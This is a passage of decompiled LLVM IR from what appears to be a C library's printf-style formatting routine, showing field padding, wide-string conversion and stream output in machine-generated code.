  %v3_14ae0 = add i32 %v6_14abc, 1
  store i32 %v3_14ae0, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ad0
  %v1_14af0 = and i32 %v2_14adc.stack_var_-316.4, 2
  %v2_14af0 = icmp eq i32 %v1_14af0, 0
  br i1 %v2_14af0, label %dec_label_pc_14afc, label %bb146

bb146:                                            ; preds = %dec_label_pc_14af0
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_14afc:                               ; preds = %dec_label_pc_14af0
  %v1_14afc = urem i32 %v2_14adc.stack_var_-316.4, 2
  %v2_14afc = icmp eq i32 %v1_14afc, 0
  br i1 %v2_14afc, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_14afc
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_14afc, %bb147
  %v0_14b58 = phi i32 [ %v6_14abc, %bb145 ], [ %v3_14ae0, %.thread18 ], [ %v6_14abc, %dec_label_pc_14afc ], [ %v6_14abc, %bb147 ], [ %v6_14abc, %bb146 ]
  %v0_14b14 = phi i32 [ %v0_14a40, %bb145 ], [ %v2_14adc, %.thread18 ], [ %v0_14a40, %dec_label_pc_14afc ], [ %v0_14a40, %bb147 ], [ %v0_14a40, %bb146 ]
  %v3_14b04 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14b04, i32* %r2.global-to-local, align 4
  store i32 %v0_14b14, i32* %r3.global-to-local, align 4
  %v1_14b0c = icmp slt i32 %v3_14b04, 0
  br i1 %v1_14b0c, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_14b3c = phi i32 [ %v3_14b04, %bb148 ], [ 1, %bb149 ]
  %v1_14b14 = and i32 %v0_14b14, 16
  %v2_14b14 = icmp eq i32 %v1_14b14, 0
  store i32 %v2_14ce8, i32* %r3.global-to-local, align 4
  %v2_14b1c = sub i32 %v2_14ce8, %v0_14b58
  %v1_14b20 = add i32 %v2_14b1c, 127
  store i32 %v1_14b20, i32* @r5, align 4
  br i1 %v2_14b14, label %bb157, label %dec_label_pc_14b28

dec_label_pc_14b28:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_14b28
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_14b28, %bb151
  br i1 %v7_14b34, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_14b3c, %v1_14b20
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_14b40, label %dec_label_pc_14b48, label %bb157

dec_label_pc_14b48:                               ; preds = %bb155
  %v1_14b48 = inttoptr i32 %v0_14b58 to i8*
  %v2_14b48 = load i8, i8* %v1_14b48, align 1
  %v3_14b48 = zext i8 %v2_14b48 to i32
  store i32 %v3_14b48, i32* %r3.global-to-local, align 4
  %v7_14b4c = icmp eq i8 %v2_14b48, 48
  br i1 %v7_14b4c, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_14b48
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_14b48
  %v2_14b54 = add i32 %v2_14b1c, 128
  store i32 %v2_14b54, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_14b90 = phi i32 [ %v0_14b3c, %bb155 ], [ %v0_14b3c, %bb150 ], [ 1, %bb156 ], [ %v2_14b54, %.thread25 ], [ %v0_14b3c, %bb154 ]
  %v1_14b58 = inttoptr i32 %v0_14b58 to i8*
  %v2_14b58 = load i8, i8* %v1_14b58, align 1
  %v3_14b58 = zext i8 %v2_14b58 to i32
  store i32 %v3_14b58, i32* %r3.global-to-local, align 4
  %v7_14b5c = icmp eq i8 %v2_14b58, 48
  br i1 %v7_14b5c, label %dec_label_pc_14b64, label %dec_label_pc_14b8c

dec_label_pc_14b64:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_14b68 = load i32, i32* @r7, align 4
  %v7_14b6c = icmp slt i32 %v0_14b68, 6
  br i1 %v7_14b6c, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_14b64
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_14b64, %bb158
  br i1 %v7_14a80, label %.thread26, label %dec_label_pc_14b80

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1f628.905 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14b80:                               ; preds = %bb159
  %v2_14b80 = icmp eq i32 %v5_14b90, 0
  br i1 %v2_14b80, label %bb160, label %dec_label_pc_14b8c

bb160:                                            ; preds = %dec_label_pc_14b80
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14b8c:                               ; preds = %dec_label_pc_14b80, %bb157
  %v2_14b8c = sub i32 %v5_14b90, %v1_14b20
  %tmp199 = icmp ugt i32 %v5_14b90, %v1_14b20
  br i1 %tmp199, label %.thread90, label %dec_label_pc_14d00

.thread90:                                        ; preds = %dec_label_pc_14b8c
  store i32 %v2_14b8c, i32* @r4, align 4
  br label %dec_label_pc_14d1cthread-pre-split

dec_label_pc_14b9c:                               ; preds = %dec_label_pc_14a10
  br i1 %tmp196, label %dec_label_pc_14bd8, label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14b9c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_14bb0 = load i32, i32* @fp, align 4
  store i32 %v0_14bb0, i32* %r0.global-to-local, align 4
  %v2_14bb4 = load i32, i32* %v1_149f8, align 4
  %v5_14bb4 = load i32, i32* %v4_14bb4, align 4
  store i32 %v5_14bb4, i32* %r2.global-to-local, align 4
  store i32 %v2_14bb8, i32* %r3.global-to-local, align 4
  %v6_14bbc = call i32 @_fpmaxtostr(i32 %v0_14bb0, i32 %v2_14bb4, i32 %v5_14bb4, i32* nonnull %stack_var_-328, i32 83996)
  store i32 %v6_14bbc, i32* %r0.global-to-local, align 4
  %v1_14bc0 = icmp slt i32 %v6_14bbc, 0
  br i1 %v1_14bc0, label %dec_label_pc_14e6c, label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14ba4
  %v2_14bcc = add i32 %v6_14bbc, %stack_var_-336.2
  store i32 %v2_14bcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e58

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14b9c
  br i1 %v3_14bdc, label %dec_label_pc_14c78, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd8
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_14bd8, label %dec_label_pc_14bf0, label %dec_label_pc_14c40

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be0
  %v2_14bf0 = load i32, i32* %v1_149f8, align 4
  store i32 %v2_14bf0, i32* %r3.global-to-local, align 4
  %v9_14bf4 = icmp eq i32 %v2_14bf0, 0
  store i32 %v2_14bf0, i32* %stack_var_-44, align 4
  br i1 %v9_14bf4, label %dec_label_pc_14d08, label %dec_label_pc_14c00

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14bf0
  %v3_14c00 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14c00, i32* %r3.global-to-local, align 4
  store i32 %v2_14c04, i32* @r0, align 4
  %v5_14c10 = icmp slt i32 %v3_14c00, -1
  br i1 %v5_14c10, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_14c00
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_14c00, %bb161
  %storemerge193 = phi i32 [ %v3_14c00, %bb161 ], [ -1, %dec_label_pc_14c00 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_14c04, i32* @r1, align 4
  store i32 %v2_14c18, i32* %r3.global-to-local, align 4
  %v0_14c1c = call i32 @__GI_wcsrtombs()
  store i32 %v0_14c1c, i32* %r0.global-to-local, align 4
  %v7_14c20 = icmp eq i32 %v0_14c1c, -1
  store i32 %v0_14c1c, i32* @r5, align 4
  br i1 %v7_14c20, label %dec_label_pc_14e6c, label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %bb162
  %v0_14c2c = load i32, i32* @sl, align 4
  store i32 %v0_14c2c, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14c2c, i32* @r6, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14be0
  store i32 %v2_14ce8, i32* %r8.global-to-local, align 4
  %v2_14c44 = load i32, i32* %v1_149f8, align 4
  store i32 %v2_14c18, i32* %r2.global-to-local, align 4
  store i32 %v2_14ce8, i32* %r0.global-to-local, align 4
  %v3_14c50 = call i32 @__GI_wcrtomb(i32 %v2_14ce8, i32 %v2_14c44, i32 %v2_14c18)
  store i32 %v3_14c50, i32* %r0.global-to-local, align 4
  %v7_14c54 = icmp eq i32 %v3_14c50, -1
  store i32 %v3_14c50, i32* @r5, align 4
  br i1 %v7_14c54, label %dec_label_pc_14e6c, label %dec_label_pc_14c60

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c40
  %v0_14c60 = load i32, i32* @sl, align 4
  store i32 %v0_14c60, i32* @r4, align 4
  store i32 %v2_14ce8, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_14c70 = trunc i32 %v0_14c60 to i8
  %v2_14c70 = load i32, i32* %r8.global-to-local, align 4
  %v4_14c70 = add i32 %v2_14c70, %v3_14c50
  %v5_14c70 = inttoptr i32 %v4_14c70 to i8*
  store i8 %v1_14c70, i8* %v5_14c70, align 1
  %v0_14d20.pre.pre = load i32, i32* @r5, align 4
  %v1_14d20.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14d1cthread-pre-split

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14bd8
  br i1 %v3_14c7c, label %dec_label_pc_14cdc, label %dec_label_pc_14c80

dec_label_pc_14c80:                               ; preds = %dec_label_pc_14c78
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_14c88 = load i32, i32* %v1_149f8, align 4
  br i1 %v7_14c78, label %dec_label_pc_14c88, label %dec_label_pc_14cb4

dec_label_pc_14c88:                               ; preds = %dec_label_pc_14c80
  store i32 %v2_14c88, i32* @r6, align 4
  %v2_14c8c = icmp eq i32 %v2_14c88, 0
  br i1 %v2_14c8c, label %dec_label_pc_14d08, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14ce4
  %v0_14ca4 = phi i32 [ %v2_14c88, %dec_label_pc_14c88 ], [ %v3_14cf4, %dec_label_pc_14ce4 ]
  %v3_14c94 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_14c94, i32* %r3.global-to-local, align 4
  %v5_14ca0 = icmp slt i32 %v3_14c94, -1
  br i1 %v5_14ca0, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_14c94
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14c94, %bb163
  %storemerge194 = phi i32 [ %v3_14c94, %bb163 ], [ -1, %dec_label_pc_14c94 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_14ca4, i32* %r0.global-to-local, align 4
  %v1_14ca8 = inttoptr i32 %v0_14ca4 to i8*
  %v2_14ca8 = call i32 @strnlen(i8* %v1_14ca8)
  store i32 %v2_14ca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d10

dec_label_pc_14cb4:                               ; preds = %dec_label_pc_14c80
  store i32 %v2_14c88, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_14ce8, i32* @r6, align 4
  store i32 %v2_14c88, i32* %stack_var_-180, align 4
  br label %dec_label_pc_14d1cthread-pre-split

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14c78
  br i1 %v7_14cdc, label %dec_label_pc_14ce4, label %dec_label_pc_14e6c

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14cdc
  %v0_14ce4 = call i32 @__errno_location()
  store i32 %v0_14ce4, i32* %r0.global-to-local, align 4
  %v1_14cec = inttoptr i32 %v0_14ce4 to i32*
  %v2_14cec = load i32, i32* %v1_14cec, align 4
  store i32 %v2_14cec, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_14cf4 = call i32 @__GI___glibc_strerror_r(i32 %v2_14cec, i32 %v2_14ce8, i32 128)
  store i32 %v3_14cf4, i32* %r0.global-to-local, align 4
  store i32 %v3_14cf4, i32* @r6, align 4
  br label %dec_label_pc_14c94

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14b8c, %.thread26, %bb160
  %v0_14d20.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_14b20, %dec_label_pc_14b8c ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14d1cthread-pre-split

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14bf0
  store i32 ptrtoint ([7 x i8]* @global_var_1f630.908 to i32), i32* @r6, align 4
  br label %dec_label_pc_14d10

dec_label_pc_14d10:                               ; preds = %bb164, %dec_label_pc_14d08
  %storemerge = phi i32 [ 6, %dec_label_pc_14d08 ], [ %v2_14ca8, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1cthread-pre-split:               ; preds = %.thread90, %dec_label_pc_14c60, %dec_label_pc_14cb4, %dec_label_pc_14d00
  %v1_14d20.pre = phi i32 [ 0, %dec_label_pc_14d00 ], [ %v1_14d20.pre.pre, %dec_label_pc_14c60 ], [ 0, %dec_label_pc_14cb4 ], [ %v2_14b8c, %.thread90 ]
  %v0_14d20.pre = phi i32 [ %v0_14d20.pre81, %dec_label_pc_14d00 ], [ %v0_14d20.pre.pre, %dec_label_pc_14c60 ], [ 1, %dec_label_pc_14cb4 ], [ %v1_14b20, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_14b14, %dec_label_pc_14d00 ], [ %v0_14a40, %dec_label_pc_14c60 ], [ %v0_14a40, %dec_label_pc_14cb4 ], [ %v0_14b14, %.thread90 ]
  %v0_14d1c.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14d1cthread-pre-split, %dec_label_pc_14c2c, %dec_label_pc_14d10
  %v1_14d5c = phi i32 [ %v1_14d20.pre, %dec_label_pc_14d1cthread-pre-split ], [ %v0_14c2c, %dec_label_pc_14c2c ], [ 0, %dec_label_pc_14d10 ]
  %v0_14d20 = phi i32 [ %v0_14d20.pre, %dec_label_pc_14d1cthread-pre-split ], [ %v0_14c1c, %dec_label_pc_14c2c ], [ %storemerge, %dec_label_pc_14d10 ]
  %v0_14d28 = phi i32 [ %v0_14d1c.pr, %dec_label_pc_14d1cthread-pre-split ], [ 11, %dec_label_pc_14c2c ], [ 11, %dec_label_pc_14d10 ]
  %v0_14d64 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_14d1cthread-pre-split ], [ %v0_14a40, %dec_label_pc_14c2c ], [ %v0_14a40, %dec_label_pc_14d10 ]
  %v7_14d1c = icmp eq i32 %v0_14d28, 11
  %v2_14d20 = add i32 %v0_14d20, %v1_14d5c
  br i1 %v7_14d1c, label %dec_label_pc_14d38, label %bb165

bb165:                                            ; preds = %dec_label_pc_14d1c
  %v7_14d30 = icmp sgt i32 %v0_14d28, 5
  %. = select i1 %v7_14d30, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_14d34 = add i32 %., %v2_14d20
  br label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d1c, %bb165
  %v0_14d4c = phi i32 [ %v2_14d20, %dec_label_pc_14d1c ], [ %v2_14d34, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_14d3c = sub i32 %tmp97, %v0_14d4c
  %v3_14d3c = icmp uge i32 %tmp97, %v0_14d4c
  %v9_14d3c = icmp eq i32 %tmp97, %v0_14d4c
  %v2_14d40 = xor i1 %v3_14d3c, true
  %v3_14d40 = or i1 %v9_14d3c, %v2_14d40
  br i1 %v3_14d40, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_14d38
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_14d38, %bb166
  %v2_14d44 = xor i1 %v9_14d3c, true
  %v3_14d44 = and i1 %v3_14d3c, %v2_14d44
  br i1 %v3_14d44, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_14d4c.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_14d3c, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_14d5c = phi i32 [ %v1_14d4c.pre, %._crit_edge ], [ %v2_14d3c, %bb168 ]
  %v2_14d4c = add i32 %v0_14d4c, %stack_var_-336.2
  %v2_14d50 = add i32 %v2_14d4c, %v2_14d5c
  store i32 %v2_14d50, i32* %ip.global-to-local, align 4
  store i32 %v0_14d64, i32* %r3.global-to-local, align 4
  %v0_14d58 = load i32, i32* @sb, align 4
  %v7_14d58 = icmp eq i32 %v0_14d58, 48
  br i1 %v7_14d58, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_14d5c = add i32 %v2_14d5c, %v1_14d5c
  store i32 %v3_14d5c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_14d78 = phi i32 [ %v2_14d5c, %bb169 ], [ 0, %bb170 ]
  %v1_14d64 = and i32 %v0_14d64, 8
  store i32 %v1_14d64, i32* @r8, align 4
  %v2_14d64 = icmp eq i32 %v1_14d64, 0
  br i1 %v2_14d64, label %dec_label_pc_14d70, label %dec_label_pc_14d8c

dec_label_pc_14d70:                               ; preds = %.thread29
  %v0_14d70 = load i32, i32* @fp, align 4
  store i32 %v0_14d70, i32* %r0.global-to-local, align 4
  store i32 %v0_14d78, i32* %r2.global-to-local, align 4
  %v4_14d7c = call i32 @_charpad(i32 %v0_14d70, i8 32, i32 %v0_14d78)
  store i32 %v4_14d7c, i32* %r0.global-to-local, align 4
  %v1_14d80 = load i32, i32* @sl, align 4
  %v9_14d80 = icmp eq i32 %v4_14d7c, %v1_14d80
  br i1 %v9_14d80, label %dec_label_pc_14d88, label %dec_label_pc_14e6c

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d70
  %v0_14d88 = load i32, i32* @r8, align 4
  store i32 %v0_14d88, i32* @sl, align 4
  %v0_14d94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14d8c

dec_label_pc_14d8c:                               ; preds = %.thread29, %dec_label_pc_14d88
  %v0_14d94 = phi i32 [ %v0_14d28, %.thread29 ], [ %v0_14d94.pre, %dec_label_pc_14d88 ]
  %v0_14d90 = load i32, i32* @fp, align 4
  %v2_14d94 = add i32 %v0_14d94, ptrtoint (i32* @global_var_1f638.910 to i32)
  store i32 %v2_14d94, i32* %r0.global-to-local, align 4
  %v2_14d98 = inttoptr i32 %v2_14d94 to i8*
  %v3_14d98 = call i32 @__GI_fputs_unlocked(i8* %v2_14d98, i32 %v0_14d90)
  %v0_14d9c = load i32, i32* @fp, align 4
  store i32 %v0_14d9c, i32* %r0.global-to-local, align 4
  %v0_14da4 = load i32, i32* @r4, align 4
  store i32 %v0_14da4, i32* %r2.global-to-local, align 4
  %v4_14da8 = call i32 @_charpad(i32 %v0_14d9c, i8 48, i32 %v0_14da4)
  store i32 %v4_14da8, i32* %r0.global-to-local, align 4
  %v1_14dac = load i32, i32* @r4, align 4
  %v9_14dac = icmp eq i32 %v4_14da8, %v1_14dac
  br i1 %v9_14dac, label %dec_label_pc_14db4, label %dec_label_pc_14e6c

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d8c
  %v3_14db4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14db4, i32* %r3.global-to-local, align 4
  %v2_14db8 = icmp eq i32 %v3_14db4, 0
  br i1 %v2_14db8, label %dec_label_pc_14dc8, label %dec_label_pc_14e28thread-pre-split

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14db4
  %v0_14dc8 = load i32, i32* @r5, align 4
  %v2_14dc8 = icmp eq i32 %v0_14dc8, 0
  br i1 %v2_14dc8, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_14dc8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_14dc8
  %v1_14dd0 = load i32, i32* @r6, align 4
  store i32 %v1_14dd0, i32* %r0.global-to-local, align 4
  %v1_14dd8 = load i32, i32* @fp, align 4
  store i32 %v1_14dd8, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 85472, i32* @lr, align 4
  %v1_14ddc = xor i1 %v2_14dc8, true
  call void @__pseudo_cond_branch(i1 %v1_14ddc, i32 ptrtoint (i32* @global_var_17e6c.901 to i32))
  %v0_14de0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14de0 = load i32, i32* @r5, align 4
  %v9_14de0 = icmp eq i32 %v0_14de0, %v1_14de0
  br i1 %v9_14de0, label %dec_label_pc_14e40, label %dec_label_pc_14e6c

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14e28
  %v2_14dec = icmp ult i32 %v1_14df0, 128
  %.v1_14df0 = select i1 %v2_14dec, i32 %v1_14df0, i32 128
  store i32 %.v1_14df0, i32* @r2, align 4
  %v0_14df8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_14df8, i32* @r4, align 4
  %v2_14dfc = icmp eq i32 %v0_14df8, 0
  store i32 %v0_14df8, i32* %r3.global-to-local, align 4
  store i32 %v2_14ce8, i32* %r0.global-to-local, align 4
  %v0_14e0c = load i32, i32* @fp, align 4
  store i32 %v0_14e0c, i32* %r2.global-to-local, align 4
  br i1 %v2_14dfc, label %dec_label_pc_14e1c, label %dec_label_pc_14e14

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14dec
  %v3_14e14 = call i32 @__stdio_fwrite(i32 %v2_14ce8, i32 %v0_14df8, i32 %v0_14e0c)
  store i32 %v3_14e14, i32* %r0.global-to-local, align 4
  store i32 %v3_14e14, i32* %r3.global-to-local, align 4
  %v1_14e1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e1c

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14dec, %dec_label_pc_14e14
  %v1_14e1c = phi i32 [ 0, %dec_label_pc_14dec ], [ %v1_14e1c.pre, %dec_label_pc_14e14 ]
  %v0_14e20 = phi i32 [ 0, %dec_label_pc_14dec ], [ %v3_14e14, %dec_label_pc_14e14 ]
  %v9_14e1c = icmp eq i32 %v0_14e20, %v1_14e1c
  %v1_14e20 = load i32, i32* @r5, align 4
  %v2_14e20 = sub i32 %v1_14e20, %v0_14e20
  store i32 %v2_14e20, i32* @r5, align 4
  br i1 %v9_14e1c, label %dec_label_pc_14e28, label %dec_label_pc_14e6c

dec_label_pc_14e28thread-pre-split:               ; preds = %dec_label_pc_14db4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14e2c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e28

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e28thread-pre-split, %dec_label_pc_14e1c
  %v1_14df0 = phi i32 [ %v0_14e2c.pr, %dec_label_pc_14e28thread-pre-split ], [ %v2_14e20, %dec_label_pc_14e1c ]
  store i32 %v2_14ce8, i32* @r6, align 4
  %v2_14e2c = icmp eq i32 %v1_14df0, 0
  store i32 %v2_14c04, i32* @r1, align 4
  store i32 %v2_14c18, i32* %r3.global-to-local, align 4
  store i32 %v2_14ce8, i32* @r0, align 4
  br i1 %v2_14e2c, label %dec_label_pc_14e40, label %dec_label_pc_14dec

dec_label_pc_14e40:                               ; preds = %dec_label_pc_14e28, %.thread36
  %v0_14e40 = load i32, i32* @fp, align 4
  store i32 %v0_14e40, i32* %r0.global-to-local, align 4
  %v0_14e48 = load i32, i32* @sl, align 4
  store i32 %v0_14e48, i32* %r2.global-to-local, align 4
  %v4_14e4c = call i32 @_charpad(i32 %v0_14e40, i8 32, i32 %v0_14e48)
  store i32 %v4_14e4c, i32* %r0.global-to-local, align 4
  %v1_14e50 = load i32, i32* @sl, align 4
  %v9_14e50 = icmp eq i32 %v4_14e4c, %v1_14e50
  br i1 %v9_14e50, label %dec_label_pc_14e58, label %dec_label_pc_14e6c

dec_label_pc_14e58:                               ; preds = %dec_label_pc_14e40, %dec_label_pc_14bc8, %dec_label_pc_149ec
  %stack_var_-316.3 = phi i32 [ %v0_14a40, %dec_label_pc_149ec ], [ %v0_14d64, %dec_label_pc_14e40 ], [ %v0_14a40, %dec_label_pc_14bc8 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_149ec ], [ %v2_14d50, %dec_label_pc_14e40 ], [ %v2_14bcc, %dec_label_pc_14bc8 ]
  %v3_14e58 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_14e58, i32* @r4, align 4
  br label %dec_label_pc_14e5c

dec_label_pc_14e5c:                               ; preds = %dec_label_pc_148fc, %dec_label_pc_14e58
  %v0_14e5c = phi i32 [ %v0_14e5c.pre, %dec_label_pc_148fc ], [ %v3_14e58, %dec_label_pc_14e58 ]
  %v0_14a40 = phi i32 [ %tmp100, %dec_label_pc_148fc ], [ %stack_var_-316.3, %dec_label_pc_14e58 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_148fc ], [ %stack_var_-336.3, %dec_label_pc_14e58 ]
  store i32 %v0_14e5c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14914.outer

dec_label_pc_14914.outer:                         ; preds = %dec_label_pc_14e64, %dec_label_pc_14e5c
  %v5_14940 = phi i32 [ %v1_14970, %dec_label_pc_14e64 ], [ %v0_14e5c, %dec_label_pc_14e5c ]
  %v0_1491449 = phi i32 [ %v1_14e64, %dec_label_pc_14e64 ], [ %v0_14e5c, %dec_label_pc_14e5c ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_14e64 ], [ %stack_var_-336.4, %dec_label_pc_14e5c ]
  %v1_14914180 = inttoptr i32 %v0_1491449 to i8*
  %v2_14914181 = load i8, i8* %v1_14914180, align 1
  %v3_14914182 = zext i8 %v2_14914181 to i32
  store i32 %v3_14914182, i32* %r3.global-to-local, align 4
  %v2_14918183 = icmp eq i8 %v2_14914181, 0
  br i1 %v2_14918183, label %dec_label_pc_14930, label %bb126

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14970
  %v1_14e64 = add i32 %v0_14978, 2
  store i32 %v1_14e64, i32* @r4, align 4
  br label %dec_label_pc_14914.outer

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14cdc, %dec_label_pc_14e40, %.thread36, %dec_label_pc_14d8c, %dec_label_pc_14d70, %dec_label_pc_14c40, %bb162, %dec_label_pc_14ba4, %bb130, %dec_label_pc_14e1c
  br label %dec_label_pc_14e74

dec_label_pc_14e74:                               ; preds = %dec_label_pc_14964, %bb, %dec_label_pc_148e4, %dec_label_pc_14e6c
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_148e4 ], [ -1, %dec_label_pc_14e6c ], [ %stack_var_-336.2, %dec_label_pc_14964 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_148a0, i32* @r5, align 4
  store i32 %v15_148a0, i32* @r8, align 4
  store i32 %v18_148a0, i32* @sb, align 4
  store i32 %v21_148a0, i32* @sl, align 4
  store i32 %v24_148a0, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_14e64, { 1, 0 }
  uselistorder i8 %v2_14914181, { 1, 2, 0 }
  uselistorder i32 %v0_1491449, { 2, 0, 1 }
  uselistorder i32 %v5_14940, { 2, 3, 1, 0 }
  uselistorder i32 %v0_14a40, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_14e5c, { 1, 0, 2 }
  uselistorder i32 %v1_14df0, { 2, 1, 0 }
  uselistorder i32 %v0_14df8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14d78, { 1, 0 }
  uselistorder i32 %v2_14d5c, { 2, 0, 1 }
  uselistorder i1 %v3_14d3c, { 1, 0 }
  uselistorder i32 %v0_14d4c, { 0, 2, 3, 1 }
